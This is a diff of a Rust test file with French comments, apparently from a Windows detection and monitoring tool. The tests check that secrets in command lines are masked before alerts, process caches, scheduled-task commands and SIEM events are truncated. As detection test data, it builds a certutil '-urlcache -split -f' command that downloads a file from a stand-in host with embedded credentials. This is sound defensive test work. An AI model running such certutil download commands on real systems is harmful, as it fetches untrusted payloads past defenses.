@@ -7378,7 +7378,14 @@ fn structure_4688_et_siem_masques() {
     let enregistrer = &siem[siem.find("pub fn enregistrer(").unwrap()..];
     let enregistrer = &enregistrer[..enregistrer.find("\n}").unwrap()];
     assert!(enregistrer.contains("masquer_secrets(&e.message)"), "{enregistrer}");
-    assert!(!include_str!("processus.rs").contains("masquer_secrets"), "les règles PRC voient la ligne entière");
+    // Les règles PRC voient la ligne non masquée : le masquage de processus.rs ne sert qu'aux copies publiées
+    // (`ligne_publiee`, appelée pour l'alerte après la décision, et copies bornées de l'arbre et du cache)
+    let processus = include_str!("processus.rs");
+    let analyse = &processus[processus.find("pub(crate) fn alerte_processus(").unwrap()..];
+    let analyse = &analyse[..analyse.find("let regle = regle_retenue(").unwrap()];
+    assert!(!analyse.contains("masquer") && !analyse.contains("ligne_publiee"), "{analyse}");
+    let ligne_motifs = &processus[processus.find("pub(crate) fn ligne_pour_motifs(").unwrap()..];
+    assert!(!ligne_motifs[..ligne_motifs.find("\n}").unwrap()].contains("masquer"), "les motifs lisent la ligne entière");
     let moniteur = include_str!("moniteur.rs");
     let brute = &moniteur[moniteur.find("fn ajouter_alerte_brute(").unwrap()..];
     let (decisions, bornage) = (brute.find("mitre::enrichir(&mut a)").unwrap(), brute.find("commun::borner_alerte(&mut a)").unwrap());
@@ -7387,7 +7394,116 @@ fn structure_4688_et_siem_masques() {
     // Chaînes d'etat.json : copie masquée et bornée (audit de #323, S323-01 : budget, avec son indicateur)
     assert!(moniteur.contains("let (chaines, chaines_tronquees) = chaines_publiees_et_troncature(&self.chaines);"));
     assert!(moniteur.contains("                chaines,\r\n                chaines_tronquees,") || moniteur.contains("                chaines,\n                chaines_tronquees,"));
-    assert!(moniteur.contains("ligne_commande: origine.as_ref().and_then(|o| o.ligne_commande.as_deref()).map(commun::masquer_secrets)"));
+    assert!(moniteur.contains("ligne_commande: origine.as_ref().and_then(processus::InfoProcessus::ligne_publiee),"));
+}
+
+/// Secret des essais « masquer avant de couper » : aucun de ses morceaux de 3 caractères n'apparaît ailleurs dans les
+/// lignes d'essai
+pub(crate) const SECRET_COUPE: &str = "Zq7Xw9Kp4Lm2Vb8N";
+
+/// Ligne `tete`, puis `avant` (début d'adresse « https://admin: », option « -Password »…), le secret et `apres` ; un
+/// bourrage place le secret pour qu'une coupe à `coupe` caractères en garde les 5 premiers caractères (avant le « @ »
+/// d'une adresse, au milieu de la valeur d'une option)
+pub(crate) fn ligne_coupee(tete: &str, coupe: usize, avant: &str, apres: &str) -> String {
+    let n = coupe.saturating_sub(tete.chars().count() + 1 + avant.chars().count() + 5);
+    let l = format!("{tete} {}{avant}{SECRET_COUPE}{apres}", "x".repeat(n));
+    assert!(l.chars().take(coupe).collect::<String>().ends_with(&SECRET_COUPE[..5]), "bourrage : {l}");
+    l
+}
+
+/// Un morceau du secret (3 caractères ou plus) se lit-il dans `texte` ?
+pub(crate) fn fuite_du_secret(texte: &str) -> bool {
+    (0..SECRET_COUPE.len() - 2).any(|i| texte.contains(&SECRET_COUPE[i..i + 3]))
+}
+
+/// Secrets à cheval sur une coupe : adresse coupée avant le « @ », valeur d'option coupée
+const SECRETS_A_CHEVAL: &[(&str, &str)] = &[(" https://admin:", "@exemple.test/f.exe sortie.exe"), (" -Password ", " -Force"),
+    (" -Password:", " -Force"), (" /pass:", " /x"), (" --password=", " --verbose")];
+
+/// Prérelecture de #323 (A-6-1, défaut préexistant) : la ligne d'une alerte PRC est coupée à 300 caractères. Coupée AVANT
+/// d'être masquée, une adresse `https://admin:motdepasse@hôte` coupée avant le « @ » n'était plus reconnue et son mot de
+/// passe partait en clair (alertes.json, SIEM, API) : le masquage se fait sur la ligne entière, la coupe ensuite. La
+/// valeur coupée d'une option (-Password, /pass:) restait masquée (non-régression). Chaque position de coupe autour du
+/// secret est essayée
+#[test]
+fn alerte_processus_masque_avant_de_couper() {
+    let certutil = r"C:\Windows\System32\certutil.exe";
+    for (avant, apres) in SECRETS_A_CHEVAL {
+        let ligne = ligne_coupee("certutil.exe -urlcache -split -f", 300, avant, apres);
+        let mut a = crate::processus::alerte_processus(1234, &info_processus_test(certutil, &ligne)).expect("PRC-003");
+        assert_eq!(a.regle, "PRC-003");
+        assert!(!fuite_du_secret(&a.raisons), "secret dans l'alerte : {}", a.raisons);
+        crate::commun::borner_alerte(&mut a);
+        assert!(!fuite_du_secret(&a.raisons) && a.raisons.contains("certutil.exe -urlcache") && a.raisons.ends_with('…'), "{}", a.raisons);
+    }
+    // Toute position de coupe, du début de l'adresse à la fin du secret
+    for coupe in 280..=300 + SECRET_COUPE.len() {
+        let ligne = format!("certutil.exe -urlcache -split -f {} https://admin:{SECRET_COUPE}@exemple.test/f.exe s.exe", "x".repeat(coupe - 60));
+        let mut a = crate::processus::alerte_processus(1, &info_processus_test(certutil, &ligne)).expect("PRC-003");
+        crate::commun::borner_alerte(&mut a);
+        assert!(!fuite_du_secret(&a.raisons), "{}", a.raisons);
+    }
+}
+
+/// Même défaut, copies bornées d'un 4688 : la copie pour l'arbre des chaînes (1 024 caractères) et le cache des
+/// processus (8 192, origine des connexions publiée dans etat.json). La copie publiable est masquée sur la ligne entière,
+/// puis coupée ; la détection garde la ligne non masquée ; une ligne prêtée par le cache garde sa copie masquée
+#[test]
+fn copies_bornees_4688_masquees_avant_de_couper() {
+    use crate::processus::{copie_pour_arbre, info_depuis_4688, info_pour_cache, Creation4688, InfoProcessus, LIGNE_ARBRE, LIGNE_CACHE};
+    for (avant, apres) in SECRETS_A_CHEVAL {
+        let ligne = ligne_coupee("outil.exe", LIGNE_ARBRE, avant, apres);
+        let c = Creation4688 { pid: 10, image: r"C:\O\outil.exe".into(), ligne_commande: Some(ligne), ppid: None, parent_image: None, heure: None };
+        let l = copie_pour_arbre(&c).ligne_commande.expect("ligne");
+        assert!(!fuite_du_secret(&l) && l.chars().count() <= LIGNE_ARBRE && l.starts_with("outil.exe"), "{l}");
+        let ligne = ligne_coupee("outil.exe", LIGNE_CACHE, avant, apres);
+        let info = info_pour_cache(InfoProcessus::pour_test(r"C:\O\outil.exe", Some(&ligne), None));
+        let publiee = info.ligne_publiee().expect("ligne");
+        assert!(!fuite_du_secret(&publiee) && publiee.chars().count() <= LIGNE_CACHE, "{}", &publiee[publiee.len() - 80..]);
+        assert!(info.ligne_commande.as_deref().is_some_and(|l| l.chars().count() == LIGNE_CACHE && l.contains(&SECRET_COUPE[..5])),
+            "la détection lit la ligne non masquée");
+        // 4688 sans ligne : la ligne prêtée par le cache vient avec sa copie masquée
+        let sans = Creation4688 { pid: 10, image: r"C:\O\outil.exe".into(), ligne_commande: None, ppid: None, parent_image: None, heure: None };
+        assert!(info_depuis_4688(&sans, Some(&info)).ligne_publiee().is_some_and(|l| !fuite_du_secret(&l)));
+    }
+    // Ligne courte : la copie publiable est la ligne masquée, entière
+    let court = info_pour_cache(InfoProcessus::pour_test(r"C:\O\outil.exe", Some("outil -Password Zq7 -x"), None));
+    assert_eq!(court.ligne_publiee().as_deref(), Some("outil -Password *** -x"));
+}
+
+/// Même défaut, commande d'une tâche planifiée bornée à 4 096 caractères (alerte PER-001/002) : la partie gardée est
+/// masquée sur la commande entière ; l'empreinte reste celle de la commande non masquée (un changement se voit toujours)
+#[test]
+fn commande_tache_masquee_avant_de_couper() {
+    use sha2::{Digest, Sha256};
+    for (avant, apres) in SECRETS_A_CHEVAL {
+        let args = ligne_coupee("/c", 4096 - r"C:\O\outil.exe ".len(), avant, apres);
+        let commande = format!(r"C:\O\outil.exe {args}");
+        let mut l = Vec::new();
+        crate::persistance::entrees_de_tache(&mut l, r"\Tache", true, &[crate::persistance::ActionTache::Exec(r"C:\O\outil.exe".into(), args)]);
+        let e = l.first().expect("entrée");
+        let empreinte: String = Sha256::digest(commande.as_bytes()).iter().map(|b| format!("{b:02x}")).collect();
+        assert!(e.commande.ends_with(&format!("{empreinte}]")), "empreinte de la commande entière : {}", e.commande);
+        let mut a = crate::persistance::alerter(e, "NOUVEAU");
+        crate::commun::borner_alerte(&mut a);
+        assert!(!fuite_du_secret(&a.raisons) && !fuite_du_secret(&e.commande), "{}", a.raisons);
+    }
+    // Commande sous la borne : inchangée (masquée plus tard, avec l'alerte)
+    assert_eq!(crate::persistance::commande_bornee("outil -Password Zq7"), "outil -Password Zq7");
+}
+
+/// Même défaut, événement d'une action de réponse (SIEM) : cible, message et déclencheur bornés à 300 caractères, masqués
+/// avant (le SIEM masque à nouveau à l'enregistrement, sans effet sur un texte déjà masqué)
+#[test]
+fn evenement_reponse_masque_avant_de_couper() {
+    for (avant, apres) in SECRETS_A_CHEVAL {
+        let texte = ligne_coupee("échec :", 300, avant, apres);
+        for e in [crate::siem::evenement_reponse("tuer", &texte, false, "m", "d"), crate::siem::evenement_reponse("tuer", "1", false, &texte, "d"),
+                  crate::siem::evenement_reponse("tuer", "1", false, "m", &texte)] {
+            let (message, destination) = (crate::commun::masquer_secrets(&e.message), crate::commun::masquer_secrets(&e.destination));
+            assert!(!fuite_du_secret(&message) && !fuite_du_secret(&destination), "{message}");
+        }
+    }
 }
 
 /// Audit du 2026-11-23, A-6-3 : purge du SIEM. 30 fichiers dont le dernier (celui du jour) dépasse le plafond : les 29
